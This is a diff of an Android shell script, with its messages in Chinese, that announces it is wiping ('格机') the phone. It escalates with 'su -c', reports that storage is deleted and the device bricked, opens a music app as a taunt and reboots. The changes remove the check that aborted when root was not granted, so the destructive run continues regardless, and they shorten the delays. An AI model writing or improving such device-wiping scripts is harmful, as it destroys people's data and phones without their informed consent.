@@ -32,18 +32,11 @@ then
 echo "\033[0;33;1m[-]开始格机 >>\033[0m"
 if [ "$(id -u)" -ne 0 ]
 then
-  echo "\033[0;33;1m->检测到你没有为脚本授予ROOT权限 正在自取...\033[0m"
+  echo "\033[0;33;1m->检测到你没有为脚本授予ROOT权限 正在自启动ROOT 继续格机 >>\033[0m"
   su -c sleep 0
-  if [ "$(id -u)" = 0 ]
-  then
-    echo "\033[0;32;1m - 自取成功 \033[0;33;1m继续格机 >>\033[0m"
-  else
-    echo "\033[0;31;1m[!]自取失败 你似乎没有ROOT权限\033[0m"
-    exit 0
-  fi
 fi
 else
-echo "\033[0;31;1m[!]需要输入正确的文字才能继续格机\033[0m"
+echo "\033[0;31;1m[!]已取消格机\033[0;33;1m 这是个明智的选择\033[0m"
 exit 0
 fi
 sleep 0.5
@@ -58,9 +51,9 @@ sleep 0.5
 echo "\033[0;32;1m-storage已删除\033[0m"
 sleep 1
 echo "\033[0;33;1m[-]你的设备已成砖 插上数据线连上电脑并播放音乐#ТАМАДА即可救回\033[0m"
-sleep 1.25
+sleep 0.5
 echo "\033[0;33;1m->即将打开酷狗音乐 >>\033[0m"
-sleep 1.25
-am start com.kugou.android/com.kugou.android.app.MediaActivity
+sleep 0.5
+su -c am start com.kugou.android/com.kugou.android.app.MediaActivity
 sleep 5
 su -c reboot
